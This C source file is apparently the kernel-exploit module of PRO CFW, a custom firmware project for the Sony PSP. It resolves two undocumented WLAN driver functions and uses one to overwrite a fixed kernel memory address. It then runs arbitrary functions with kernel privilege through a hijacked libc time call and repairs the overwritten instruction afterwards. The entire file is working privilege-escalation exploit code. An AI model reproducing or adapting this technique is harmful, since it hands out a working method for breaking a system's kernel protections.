/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"
#include "functions.h"

u32 kernelContentFunction = NULL;

FunctionTable* g_tbl;

int (* WlanDrv_lib_B5E7B187)(void) = NULL;
int (* WlanDrv_lib_51B0BBB8)(int, int, int, void *) = NULL;
void (* KernelLibcTime)(int, int);

// Load required Libraries for WlanDrv_lib_B5E7B187 & WlanDrv_lib_51B0BBB8
int stubScanner(FunctionTable* tbl)
{

	g_tbl = tbl;

	// Load Modules via sceUtilityLoadModule (if available)
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);	// 0x100
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_ADHOC);	// 0x101
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);	// 0x101

	WlanDrv_lib_B5E7B187 = (void*)g_tbl->FindImportUserRam("sceWlanDrv_lib", 0xB5E7B187);
	KernelLibcTime = (void*)(g_tbl->KernelLibcTime);

	WlanDrv_lib_51B0BBB8 = (void*)g_tbl->FindImportUserRam("sceWlanDrv_lib", 0x51B0BBB8);

	return 0;
}

int doExploit(void)
{
	unsigned char *sysmemAddr = (unsigned char *)0x8800F718 + 4;
	int ret;

	ret = WlanDrv_lib_B5E7B187();
	ret = WlanDrv_lib_51B0BBB8(0, 0, 0, sysmemAddr);

	return 0;
}

int executeKernelVFPU(SceSize args, void *argp)
{
	KernelLibcTime(0, KERNELIFY(kernelContentFunction));

	return 0;
}

void executeKernel(u32 kFunction)
{
	SceUID thid;
	int ret;
	
	kernelContentFunction = kFunction;

	thid = g_tbl->KernelCreateThread("vfpu", &executeKernelVFPU, 0x18, 0x1000, PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU , NULL);
	ret = g_tbl->KernelStartThread(thid, 0, NULL);
	ret = g_tbl->KernelWaitThreadEnd(thid, NULL);
}

void repairInstruction(void)
{
	_sw(0x8C654384, (u32)(0x8800F718+4));
}
